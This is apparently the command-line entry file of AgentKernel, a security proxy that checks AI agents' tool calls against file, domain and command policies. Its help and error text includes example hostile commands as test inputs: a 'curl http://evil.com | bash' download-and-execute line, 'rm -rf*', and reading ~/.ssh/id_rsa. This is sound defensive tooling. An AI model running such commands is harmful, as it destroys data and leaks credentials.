#!/usr/bin/env node
// AgentKernel CLI — Security runtime for AI agents

import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { createInterface } from "node:readline/promises";
import { parseArgs } from "node:util";
import {
  ConsoleOpenClawAuditSink,
  FileOpenClawAuditSink,
  type OpenClawAuditSink,
} from "./audit.js";
import { loadOpenClawProxyConfigFromEnv } from "./config.js";
import { getDefaultOpenClawPolicy, mergeWithDefaultPolicy } from "./default-policy.js";
import {
  type PolicyTemplate,
  addAllowRule,
  addBlockRule,
  generatePolicyFromTemplate,
  loadSimplifiedPolicy,
  removeRules,
  resolveTarget,
  resolveTypedTarget,
  simplifiedToRuntimeFormat,
  summarizePolicy,
  testPolicy,
} from "./policy-manager.js";
import { type OpenClawProxyConfig, createOpenClawProxy } from "./proxy.js";

// ─── CLI COLORS ───────────────────────────────────────────────────

const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  cyan: "\x1b[36m",
  bold: "\x1b[1m",
};

function log(message: string, color: keyof typeof colors = "reset"): void {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function logError(message: string): void {
  console.error(`${colors.red}Error: ${message}${colors.reset}`);
}

function getGatewayHostname(gatewayUrl: string): string | null {
  try {
    return new URL(gatewayUrl).hostname.toLowerCase();
  } catch {
    return null;
  }
}

function isLocalGatewayUrl(gatewayUrl: string): boolean {
  const hostname = getGatewayHostname(gatewayUrl);
  return hostname === "127.0.0.1" || hostname === "localhost" || hostname === "::1";
}

// ─── BANNER ───────────────────────────────────────────────────────

function printBanner(): void {
  console.log(`
${colors.cyan}${colors.bold}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║     █████╗  ██████╗ ███████╗███╗   ██╗████████╗           ║
    ║    ██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝           ║
    ║    ███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║              ║
    ║    ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║              ║
    ║    ██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║              ║
    ║    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝              ║
    ║    ██╗  ██╗███████╗██████╗ ███╗   ██╗███████╗██╗          ║
    ║    ██║ ██╔╝██╔════╝██╔══██╗████╗  ██║██╔════╝██║          ║
    ║    █████╔╝ █████╗  ██████╔╝██╔██╗ ██║█████╗  ██║          ║
    ║    ██╔═██╗ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██║          ║
    ║    ██║  ██╗███████╗██║  ██║██║ ╚████║███████╗███████╗     ║
    ║    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝     ║
    ║                                                           ║
    ║           Security Runtime for AI Agents                  ║
    ║                     v0.1.5                                ║
    ╚═══════════════════════════════════════════════════════════╝
${colors.reset}`);
}

// ─── HELP ─────────────────────────────────────────────────────────

function printHelp(): void {
  console.log(`
${colors.bold}AgentKernel${colors.reset} — Security runtime for AI agents

${colors.bold}Usage:${colors.reset}
  agentkernel <command> [options]

${colors.bold}Commands:${colors.reset}
  start              Start the security proxy
  init               Initialize security policy (interactive wizard)
  allow <target>     Allow access to a resource
  block <target>     Block access to a resource
  unblock <target>   Remove a block rule
  policy show        Show current policy in plain English
  policy test        Test what the policy would do
  status             Show proxy status and statistics
  audit              View audit logs
  config             Show current configuration

${colors.bold}Allow/Block Options:${colors.reset}
  --domain <host>         Target a specific domain
  --file <path>           Target a specific file path
  --command <cmd>         Target a specific shell command

${colors.bold}Init Options:${colors.reset}
  --template <name>       Use template: strict, balanced, permissive
  --force                 Overwrite existing policy

${colors.bold}Start Options:${colors.reset}
  --host <ip>             Bind address (default: 0.0.0.0 — all interfaces)
  --port <number>         Proxy listen port (default: 18788)
  --gateway <url>         Agent gateway URL (if not set, runs standalone)
  --policy <file>         Custom policy YAML file
  --log-file <file>       Audit log file path

${colors.bold}Audit Options:${colors.reset}
  --since <duration>      Show logs since (e.g., 1h, 30m, 1d)
  --blocked-only          Show only blocked operations
  --tool <name>           Filter by tool name
  --limit <number>        Limit number of entries (default: 100)

${colors.bold}Examples:${colors.reset}
  agentkernel init                          # Interactive setup wizard
  agentkernel start                         # Start in standalone mode
  agentkernel start --gateway ws://gw:18789 # Start in proxy mode
  agentkernel allow "github"                # Allow GitHub access
  agentkernel block "telegram"              # Block Telegram
  agentkernel allow --domain api.example.com
  agentkernel block --file "/secrets/**"
  agentkernel unblock "telegram"
  agentkernel policy show                   # See what's blocked/allowed
  agentkernel policy test --domain api.telegram.org
  agentkernel audit --blocked-only --since 1h

${colors.bold}Learn More:${colors.reset}
  https://github.com/vijaygopalbalasa/AgentKernel
`);
}

// ─── CONFIG PATHS ────────────────────────────────────────────────

function getConfigDir(): string {
  return join(homedir(), ".agentkernel");
}

function getPolicyFile(): string {
  return join(getConfigDir(), "policy.yaml");
}

function getLogDir(): string {
  return join(getConfigDir(), "logs");
}

// ─── INIT COMMAND ─────────────────────────────────────────────────

async function initCommand(args: { template?: string; force?: boolean }): Promise<void> {
  const configDir = getConfigDir();
  const policyFile = getPolicyFile();

  log("\nInitializing AgentKernel...", "cyan");

  // Create config directory if needed
  if (!existsSync(configDir)) {
    mkdirSync(configDir, { recursive: true });
    log(`  Created ${configDir}`, "green");
  }

  // Create logs directory
  const logDir = getLogDir();
  if (!existsSync(logDir)) {
    mkdirSync(logDir, { recursive: true });
    log(`  Created ${logDir}`, "green");
  }

  // Check if policy file already exists
  if (existsSync(policyFile) && !args.force) {
    log(`  Policy file already exists: ${policyFile}`, "yellow");
    log("  Use --force to overwrite", "yellow");
    return;
  }

  // Interactive mode if TTY and no --template flag
  if (process.stdin.isTTY && !args.template) {
    await interactiveInit(policyFile);
    return;
  }

  // Non-interactive: use --template flag or default to balanced
  const template = (args.template as PolicyTemplate) ?? "balanced";
  if (!["strict", "balanced", "permissive"].includes(template)) {
    logError(`Invalid template: ${template}. Use strict, balanced, or permissive.`);
    process.exit(1);
  }

  const yaml = generatePolicyFromTemplate({ template, projectFolder: process.cwd() });
  writeFileSync(policyFile, yaml, "utf-8");
  log(`  Created ${template} security policy: ${policyFile}`, "green");
  printInitSuccess(policyFile, template);
}

async function interactiveInit(policyFile: string): Promise<void> {
  const rl = createInterface({ input: process.stdin, output: process.stdout });

  try {
    log(`\n${colors.bold}AgentKernel Security Setup${colors.reset}\n`, "cyan");

    // Step 1: Protection level
    log("What protection level do you want?", "bold");
    log(
      `  1) ${colors.red}strict${colors.reset}     - Block everything except explicitly allowed (safest)`,
    );
    log(
      `  2) ${colors.yellow}balanced${colors.reset}   - Block known threats, allow common dev tools (recommended)`,
    );
    log(
      `  3) ${colors.green}permissive${colors.reset} - Allow everything except known malicious patterns`,
    );
    const levelAnswer = await rl.question("\nChoose [1-3] (default: 2): ");
    const level = levelAnswer.trim();
    const template: PolicyTemplate =
      level === "1" ? "strict" : level === "3" ? "permissive" : "balanced";

    // Step 2: Project folder
    log("\nWhere is your project folder?", "bold");
    const cwd = process.cwd();
    log(`  Auto-detected: ${cwd}`);
    const folderAnswer = await rl.question("Enter path (or press Enter to accept): ");
    const projectFolder = folderAnswer.trim() || cwd;

    // Step 3: Dev tools (only for strict)
    let allowDevTools = true;
    if (template === "strict") {
      const devAnswer = await rl.question(
        "\nAllow dev tool network access? (npm, GitHub, PyPI) [Y/n]: ",
      );
      allowDevTools = devAnswer.trim().toLowerCase() !== "n";
    }

    const yaml = generatePolicyFromTemplate({ template, projectFolder, allowDevTools });
    writeFileSync(policyFile, yaml, "utf-8");
    printInitSuccess(policyFile, template, projectFolder);
  } finally {
    rl.close();
  }
}

function printInitSuccess(policyFile: string, template: string, projectFolder?: string): void {
  log(`\n${colors.green}${colors.bold}Setup complete!${colors.reset}`);
  log(`  Policy file:      ${policyFile}`, "green");
  log(`  Protection level: ${template}`);
  if (projectFolder) log(`  Project folder:   ${projectFolder}`);
  log(`\n${colors.bold}Next steps:${colors.reset}`);
  log(`  agentkernel start        ${colors.cyan}# Start the security proxy${colors.reset}`);
  log(`  agentkernel policy show  ${colors.cyan}# See what's blocked/allowed${colors.reset}`);
  log(`  agentkernel allow "npm"  ${colors.cyan}# Allow a resource${colors.reset}`);
  log(`  agentkernel block "telegram"  ${colors.cyan}# Block a resource${colors.reset}\n`);
}

// ─── ALLOW COMMAND ──────────────────────────────────────────────

async function allowCommand(args: {
  target: string;
  domain?: string;
  file?: string;
  command?: string;
}): Promise<void> {
  const policyFile = getPolicyFile();
  const target = resolveCommandTarget(args);

  if (!target) {
    logError(
      'Could not resolve target. Try:\n  agentkernel allow "github"\n  agentkernel allow --domain api.example.com\n  agentkernel allow --file ~/my-project',
    );
    process.exit(1);
  }

  const result = addAllowRule(policyFile, target);

  if (result.alreadyExists) {
    log(`  Already allowed: ${target.label}`, "yellow");
  } else {
    log(`  ${colors.green}+${colors.reset} ${result.description}`);
  }
}

// ─── BLOCK COMMAND ──────────────────────────────────────────────

async function blockCommand(args: {
  target: string;
  domain?: string;
  file?: string;
  command?: string;
}): Promise<void> {
  const policyFile = getPolicyFile();
  const target = resolveCommandTarget(args);

  if (!target) {
    logError(
      'Could not resolve target. Try:\n  agentkernel block "telegram"\n  agentkernel block --domain evil.com\n  agentkernel block --command "rm -rf*"',
    );
    process.exit(1);
  }

  const result = addBlockRule(policyFile, target);

  if (result.alreadyExists) {
    log(`  Already blocked: ${target.label}`, "yellow");
  } else {
    log(`  ${colors.red}x${colors.reset} ${result.description}`);
  }
}

// ─── UNBLOCK COMMAND ────────────────────────────────────────────

async function unblockCommand(args: { target: string }): Promise<void> {
  const policyFile = getPolicyFile();
  const target = resolveTarget(args.target);

  if (!target) {
    logError(`Could not resolve target: "${args.target}"`);
    process.exit(1);
  }

  const result = removeRules(policyFile, target);

  if (result.removed === 0) {
    log(`  No matching rules found for: ${target.label}`, "yellow");
  } else {
    for (const desc of result.descriptions) {
      log(`  ${colors.green}-${colors.reset} Removed: ${desc}`);
    }
  }

  for (const warning of result.warnings) {
    log(`\n  ${colors.yellow}${warning}${colors.reset}`);
  }
}

// ─── POLICY SHOW COMMAND ────────────────────────────────────────

async function policyShowCommand(): Promise<void> {
  const policyFile = getPolicyFile();

  if (!existsSync(policyFile)) {
    log("No custom policy found. Using defaults (341+ malicious patterns blocked).", "yellow");
    log(`Run 'agentkernel init' to create a custom policy.\n`, "cyan");
    return;
  }

  const summary = summarizePolicy(policyFile);

  log(`\n${colors.bold}Security Policy: ${summary.templateName}${colors.reset}\n`);

  if (summary.blockedFiles.length > 0) {
    log(
      `${colors.red}BLOCKED FILES${colors.reset} (${summary.blockedFiles.length} rules):`,
      "bold",
    );
    for (const entry of summary.blockedFiles) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.allowedFiles.length > 0) {
    log(
      `${colors.green}ALLOWED FILES${colors.reset} (${summary.allowedFiles.length} rules):`,
      "bold",
    );
    for (const entry of summary.allowedFiles) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.blockedDomains.length > 0) {
    log(
      `${colors.red}BLOCKED WEBSITES${colors.reset} (${summary.blockedDomains.length} rules):`,
      "bold",
    );
    for (const entry of summary.blockedDomains) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.allowedDomains.length > 0) {
    log(
      `${colors.green}ALLOWED WEBSITES${colors.reset} (${summary.allowedDomains.length} rules):`,
      "bold",
    );
    for (const entry of summary.allowedDomains) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.blockedCommands.length > 0) {
    log(
      `${colors.red}BLOCKED COMMANDS${colors.reset} (${summary.blockedCommands.length} rules):`,
      "bold",
    );
    for (const entry of summary.blockedCommands) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.allowedCommands.length > 0) {
    log(
      `${colors.green}ALLOWED COMMANDS${colors.reset} (${summary.allowedCommands.length} rules):`,
      "bold",
    );
    for (const entry of summary.allowedCommands) {
      log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
    }
    log("");
  }

  if (summary.blockedSecrets.length > 0 || summary.allowedSecrets.length > 0) {
    if (summary.blockedSecrets.length > 0) {
      log(
        `${colors.red}BLOCKED SECRETS${colors.reset} (${summary.blockedSecrets.length} rules):`,
        "bold",
      );
      for (const entry of summary.blockedSecrets) {
        log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
      }
      log("");
    }
    if (summary.allowedSecrets.length > 0) {
      log(
        `${colors.green}ALLOWED SECRETS${colors.reset} (${summary.allowedSecrets.length} rules):`,
        "bold",
      );
      for (const entry of summary.allowedSecrets) {
        log(`  * ${entry.label} (${entry.patterns.join(", ")})`);
      }
      log("");
    }
  }

  log(
    `Default: Everything else is ${summary.defaultDecision === "block" ? "BLOCKED" : "ALLOWED"}\n`,
  );
}

// ─── POLICY TEST COMMAND ────────────────────────────────────────

async function policyTestCommand(args: {
  domain?: string;
  file?: string;
  command?: string;
}): Promise<void> {
  const policyFile = getPolicyFile();

  if (!args.domain && !args.file && !args.command) {
    logError(
      'Specify what to test:\n  agentkernel policy test --domain api.telegram.org\n  agentkernel policy test --file ~/.ssh/id_rsa\n  agentkernel policy test --command "curl http://evil.com | bash"',
    );
    process.exit(1);
  }

  const result = await testPolicy(policyFile, args);
  const color =
    result.decision === "block" ? "red" : result.decision === "allow" ? "green" : "yellow";
  const label =
    result.decision === "block"
      ? "BLOCKED"
      : result.decision === "allow"
        ? "ALLOWED"
        : "REQUIRES APPROVAL";

  log(`\n  ${colors[color]}${label}${colors.reset} - ${result.reason}`);
  if (result.matchedRule) {
    log(`  Matched rule: ${result.matchedRule}`);
  }
  log("");
}

// ─── HELPER ─────────────────────────────────────────────────────

function resolveCommandTarget(args: {
  target: string;
  domain?: string;
  file?: string;
  command?: string;
}) {
  if (args.domain) return resolveTypedTarget(args.domain, "domain");
  if (args.file) return resolveTypedTarget(args.file, "file");
  if (args.command) return resolveTypedTarget(args.command, "command");
  return resolveTarget(args.target);
}

// ─── START COMMAND ────────────────────────────────────────────────

async function startCommand(args: {
  host?: string;
  port?: number;
  gateway?: string;
  policy?: string;
  logFile?: string;
}): Promise<void> {
  printBanner();

  // Load config from environment
  const envConfig = loadOpenClawProxyConfigFromEnv();

  // Auto-detect mode: evaluate (standalone) if no gateway specified, proxy if gateway given
  const hasGateway = !!(args.gateway ?? envConfig.gatewayUrl);
  const listenHost = args.host ?? envConfig.listenHost ?? "0.0.0.0";
  const listenPort = args.port ?? envConfig.listenPort ?? 18788;

  const config: OpenClawProxyConfig = {
    ...envConfig,
    listenHost,
    listenPort,
    mode: hasGateway ? "proxy" : "evaluate",
  };

  // Only set gateway URL in proxy mode
  if (hasGateway) {
    const gatewayUrl = args.gateway ?? envConfig.gatewayUrl ?? "ws://127.0.0.1:18789";
    const localGateway = isLocalGatewayUrl(gatewayUrl);
    const explicitSkip = envConfig.skipSsrfValidation === true;
    const hostname = getGatewayHostname(gatewayUrl);

    config.gatewayUrl = gatewayUrl;
    config.skipSsrfValidation = explicitSkip && localGateway;
    config.allowedGatewayHosts =
      envConfig.allowedGatewayHosts ??
      (localGateway && hostname && !explicitSkip ? [hostname] : undefined);

    if (explicitSkip && !localGateway) {
      log(
        "Ignoring AGENTKERNEL_SKIP_SSRF_VALIDATION because gateway is not localhost/loopback",
        "yellow",
      );
    }
  }

  // Load policy
  let policySet = getDefaultOpenClawPolicy();

  if (args.policy) {
    log(`Loading policy from ${args.policy}...`, "cyan");
    const simplified = loadSimplifiedPolicy(args.policy);
    const customPolicy = simplifiedToRuntimeFormat(simplified);
    policySet = mergeWithDefaultPolicy(customPolicy);
  } else {
    // Check for default policy file
    const defaultPolicyFile = getPolicyFile();
    if (existsSync(defaultPolicyFile)) {
      log(`Loading policy from ${defaultPolicyFile}...`, "cyan");
      const simplified = loadSimplifiedPolicy(defaultPolicyFile);
      const customPolicy = simplifiedToRuntimeFormat(simplified);
      policySet = mergeWithDefaultPolicy(customPolicy);
    } else {
      log("Using default security policy (341+ malicious patterns blocked)", "cyan");
    }
  }

  config.policySet = policySet;

  // Set up audit sinks
  const logDir = getLogDir();
  if (!existsSync(logDir)) {
    mkdirSync(logDir, { recursive: true });
  }

  const auditSinks: OpenClawAuditSink[] = [new ConsoleOpenClawAuditSink()];
  const logFile = args.logFile ?? join(logDir, `audit-${Date.now()}.log`);
  auditSinks.push(new FileOpenClawAuditSink(logFile));
  config.auditSinks = auditSinks;

  // Security event callback
  config.onSecurityEvent = (event) => {
    if (event.type === "blocked") {
      log(`  [BLOCKED] ${event.tool}: ${event.reason}`, "red");
    } else if (event.type === "rate_limited") {
      log(`  [RATE LIMITED] ${event.tool}`, "yellow");
    }
  };

  // Approval callback: interactive when TTY, auto-deny otherwise
  if (process.stdin.isTTY) {
    config.onApprovalRequest = async (call) => {
      log(`\n  [APPROVAL REQUIRED] ${call.tool}`, "yellow");
      log(`  Args: ${JSON.stringify(call.args)}`, "yellow");
      const rl = createInterface({ input: process.stdin, output: process.stdout });
      try {
        const answer = await rl.question(`${colors.yellow}  Approve? (y/n): ${colors.reset}`);
        return answer.trim().toLowerCase() === "y";
      } finally {
        rl.close();
      }
    };
  } else {
    config.onApprovalRequest = async (call) => {
      log(`  [APPROVAL REQUIRED] ${call.tool} — auto-denied (non-interactive)`, "yellow");
      return false;
    };
  }

  const mode = config.mode ?? "evaluate";
  log(`\nStarting AgentKernel in ${mode.toUpperCase()} mode...`, "cyan");
  log(`  Listen: ${config.listenHost}:${config.listenPort}`, "blue");
  if (mode === "proxy") {
    log(`  Gateway URL: ${config.gatewayUrl}`, "blue");
  }
  log(`  Audit log: ${logFile}`, "blue");

  try {
    const proxy = await createOpenClawProxy(config);

    if (mode === "evaluate") {
      const addr = listenHost === "0.0.0.0" ? "localhost" : listenHost;
      log(`
${colors.green}${colors.bold}AgentKernel is running in STANDALONE mode!${colors.reset}

Your AI agents are now protected against:
  ${colors.green}+${colors.reset} Credential theft (API keys, tokens, SSH keys)
  ${colors.green}+${colors.reset} Data exfiltration (Telegram, Discord, paste sites)
  ${colors.green}+${colors.reset} Malware (reverse shells, download & execute)
  ${colors.green}+${colors.reset} SSRF attacks (cloud metadata, internal networks)

${colors.bold}HTTP API:${colors.reset}
  curl http://${addr}:${listenPort}/health
  curl -X POST http://${addr}:${listenPort}/evaluate \\
    -H "Content-Type: application/json" \\
    -d '{"tool":"bash","args":{"command":"cat ~/.ssh/id_rsa"}}'

${colors.bold}WebSocket:${colors.reset} ws://${addr}:${listenPort}
  Accepts: OpenClaw, MCP/JSON-RPC, or Simple format

${colors.bold}Proxy mode:${colors.reset} agentkernel start --gateway ws://your-gateway:port

Press Ctrl+C to stop
`);
    } else {
      log(`
${colors.green}${colors.bold}AgentKernel is running in PROXY mode!${colors.reset}

Your AI agents are now protected against:
  ${colors.green}+${colors.reset} Credential theft (API keys, tokens, SSH keys)
  ${colors.green}+${colors.reset} Data exfiltration (Telegram, Discord, paste sites)
  ${colors.green}+${colors.reset} Malware (reverse shells, download & execute)
  ${colors.green}+${colors.reset} SSRF attacks (cloud metadata, internal networks)

${colors.bold}Connect your agent to:${colors.reset}
  ws://${listenHost === "0.0.0.0" ? "<your-ip>" : listenHost}:${listenPort}

${colors.bold}Gateway:${colors.reset} ${config.gatewayUrl}

Press Ctrl+C to stop
`);
    }

    // Handle shutdown
    const shutdown = async (signal: string) => {
      log(`\nReceived ${signal}, shutting down...`, "yellow");
      await proxy.stop();

      const stats = proxy.getStats();
      log(`
${colors.cyan}Session Statistics:${colors.reset}
  Mode:            ${stats.mode}
  Total messages:  ${stats.totalMessages}
  Tool calls:      ${stats.totalToolCalls}
  ${colors.green}Allowed:${colors.reset}         ${stats.allowedCalls}
  ${colors.red}Blocked:${colors.reset}         ${stats.blockedCalls}
  Rate limited:    ${stats.rateLimitedMessages}
  Uptime:          ${stats.uptimeSeconds}s
`);
      process.exit(0);
    };

    process.on("SIGINT", () => shutdown("SIGINT"));
    process.on("SIGTERM", () => shutdown("SIGTERM"));

    // Keep process alive
    await new Promise(() => {});
  } catch (error) {
    logError(error instanceof Error ? error.message : String(error));
    process.exit(1);
  }
}

// ─── STATUS COMMAND ───────────────────────────────────────────────

async function statusCommand(): Promise<void> {
  log("\nAgentKernel Status", "cyan");
  log("─".repeat(40));

  const configDir = getConfigDir();
  const policyFile = getPolicyFile();

  // Check config directory
  if (existsSync(configDir)) {
    log(`  Config dir: ${configDir}`, "green");
  } else {
    log("  Config dir: Not initialized", "yellow");
    log(`  Run 'agentkernel init' to set up`, "yellow");
  }

  // Check policy file
  if (existsSync(policyFile)) {
    log(`  Policy file: ${policyFile}`, "green");
  } else {
    log("  Policy file: Using defaults", "yellow");
  }

  // Try to connect to a running proxy's HTTP API
  const envConfig = loadOpenClawProxyConfigFromEnv();
  const port = envConfig.listenPort ?? 18788;
  const host = envConfig.listenHost ?? "127.0.0.1";
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 2000);
    const resp = await fetch(`http://${host}:${port}/health`, { signal: controller.signal });
    clearTimeout(timeout);
    if (resp.ok) {
      const health = (await resp.json()) as { status: string; mode: string; uptime: number };
      log(`\n  Proxy:   ${colors.green}RUNNING${colors.reset} (${health.mode} mode)`, "green");
      log(`  Uptime:  ${health.uptime}s`);
      // Also fetch stats
      const statsResp = await fetch(`http://${host}:${port}/stats`);
      if (statsResp.ok) {
        const stats = (await statsResp.json()) as {
          totalToolCalls: number;
          allowedCalls: number;
          blockedCalls: number;
          activeConnections: number;
        };
        log(`  Connections: ${stats.activeConnections}`);
        log(`  Tool calls:  ${stats.totalToolCalls} (${colors.green}${stats.allowedCalls} allowed${colors.reset}, ${colors.red}${stats.blockedCalls} blocked${colors.reset})`);
      }
    }
  } catch {
    log(`\n  Proxy:   ${colors.yellow}NOT RUNNING${colors.reset}`, "yellow");
    log(`  Run 'agentkernel start' to start the security proxy`);
  }
  log("");
}

// ─── AUDIT COMMAND ────────────────────────────────────────────────

async function auditCommand(args: {
  since?: string;
  blockedOnly?: boolean;
  tool?: string;
  limit?: number;
}): Promise<void> {
  const logDir = getLogDir();

  if (!existsSync(logDir)) {
    log("No audit logs found. Start the proxy first with 'agentkernel start'", "yellow");
    return;
  }

  log("\nAgentKernel Audit Log", "cyan");
  log("─".repeat(60));

  // Find most recent log file
  const { readdirSync } = await import("node:fs");
  const files = readdirSync(logDir)
    .filter((f) => f.startsWith("audit-") && f.endsWith(".log"))
    .sort()
    .reverse();

  if (files.length === 0) {
    log("No audit logs found.", "yellow");
    return;
  }

  const latestLog = join(logDir, files[0]!);
  log(`  Reading: ${latestLog}\n`, "blue");

  const content = readFileSync(latestLog, "utf-8");
  const lines = content.split("\n").filter((l) => l.trim());

  let count = 0;
  const limit = args.limit ?? 100;

  for (const line of lines.reverse()) {
    if (count >= limit) break;

    try {
      const event = JSON.parse(line);

      if (args.blockedOnly && event.decision !== "block") continue;
      if (args.tool && event.toolName !== args.tool) continue;

      if (args.since) {
        const eventTime = new Date(event.timestamp);
        const sinceMs = parseDuration(args.since);
        if (Date.now() - eventTime.getTime() > sinceMs) continue;
      }

      const timestamp = new Date(event.timestamp).toLocaleString();
      const tool = event.toolName || "-";
      const decision = event.decision || event.type;
      const color = decision === "block" ? "red" : decision === "allow" ? "green" : "blue";

      log(`  ${timestamp}  ${decision.toUpperCase().padEnd(8)}  ${tool}`, color);
      if (event.reason) {
        log(`    ${event.reason}`, "reset");
      }

      count++;
    } catch {
      // Skip invalid JSON lines
    }
  }

  log(`\n  Showing ${count} entries`);
}

function parseDuration(duration: string): number {
  const match = duration.match(/^(\d+)([smhd])$/);
  if (!match) return 3600000;

  const value = Number.parseInt(match[1]!, 10);
  const unit = match[2];

  switch (unit) {
    case "s":
      return value * 1000;
    case "m":
      return value * 60 * 1000;
    case "h":
      return value * 60 * 60 * 1000;
    case "d":
      return value * 24 * 60 * 60 * 1000;
    default:
      return 3600000;
  }
}

// ─── CONFIG COMMAND ───────────────────────────────────────────────

async function configCommand(): Promise<void> {
  log("\nAgentKernel Configuration", "cyan");
  log("─".repeat(40));

  const envConfig = loadOpenClawProxyConfigFromEnv();

  const mode = envConfig.gatewayUrl ? "proxy" : "evaluate (standalone)";
  log(`  Mode:         ${mode}`, "blue");
  log(`  Listen:       ${envConfig.listenHost ?? "0.0.0.0"}:${envConfig.listenPort ?? 18788}`, "blue");
  if (envConfig.gatewayUrl) {
    log(`  Gateway URL:  ${envConfig.gatewayUrl}`, "blue");
  }
  log(`  Config dir:   ${getConfigDir()}`, "blue");

  const policyFile = getPolicyFile();
  if (existsSync(policyFile)) {
    log(`  Policy file:  ${policyFile}`, "green");
  } else {
    log("  Policy file:  Using defaults", "yellow");
  }

  log(`
${colors.bold}Environment Variables:${colors.reset}
  AGENTKERNEL_HOST                       Bind address (default: 0.0.0.0)
  AGENTKERNEL_PORT                       Proxy listen port
  AGENTKERNEL_GATEWAY_URL                Gateway URL (if set, enables proxy mode)
  AGENTKERNEL_POLICY_FILE                Custom policy file path
  AGENTKERNEL_SKIP_SSRF_VALIDATION       Allow localhost SSRF bypass only
  AGENTKERNEL_ALLOWED_GATEWAY_HOSTS      CSV allowlist (example: host1,host2)
  OPENCLAW_*                             Legacy aliases (still supported)
`);
}

// ─── MAIN ─────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const { values, positionals } = parseArgs({
    allowPositionals: true,
    options: {
      help: { type: "boolean", short: "h" },
      version: { type: "boolean", short: "v" },
      host: { type: "string" },
      port: { type: "string" },
      gateway: { type: "string" },
      policy: { type: "string" },
      "log-file": { type: "string" },
      since: { type: "string" },
      "blocked-only": { type: "boolean" },
      tool: { type: "string" },
      limit: { type: "string" },
      force: { type: "boolean" },
      domain: { type: "string" },
      file: { type: "string" },
      command: { type: "string" },
      template: { type: "string" },
    },
  });

  if (values.version) {
    console.log("agentkernel v0.1.5");
    return;
  }

  if (values.help || positionals.length === 0) {
    printHelp();
    return;
  }

  const command = positionals[0];

  switch (command) {
    case "start":
      await startCommand({
        host: values.host,
        port: values.port ? Number.parseInt(values.port, 10) : undefined,
        gateway: values.gateway,
        policy: values.policy,
        logFile: values["log-file"],
      });
      break;

    case "init":
      await initCommand({ template: values.template, force: values.force });
      break;

    case "allow":
      await allowCommand({
        target: positionals.slice(1).join(" "),
        domain: values.domain,
        file: values.file,
        command: values.command,
      });
      break;

    case "block":
      await blockCommand({
        target: positionals.slice(1).join(" "),
        domain: values.domain,
        file: values.file,
        command: values.command,
      });
      break;

    case "unblock":
      await unblockCommand({ target: positionals.slice(1).join(" ") });
      break;

    case "policy":
      if (positionals[1] === "show") {
        await policyShowCommand();
      } else if (positionals[1] === "test") {
        await policyTestCommand({
          domain: values.domain,
          file: values.file,
          command: values.command,
        });
      } else {
        log("\nPolicy commands:", "bold");
        log("  agentkernel policy show    Show current policy in plain English");
        log("  agentkernel policy test    Test what the policy would do\n");
      }
      break;

    case "status":
      await statusCommand();
      break;

    case "audit":
      await auditCommand({
        since: values.since,
        blockedOnly: values["blocked-only"],
        tool: values.tool,
        limit: values.limit ? Number.parseInt(values.limit, 10) : undefined,
      });
      break;

    case "config":
      await configCommand();
      break;

    default:
      logError(`Unknown command: ${command}`);
      printHelp();
      process.exit(1);
  }
}

main().catch((error) => {
  logError(error instanceof Error ? error.message : String(error));
  process.exit(1);
});
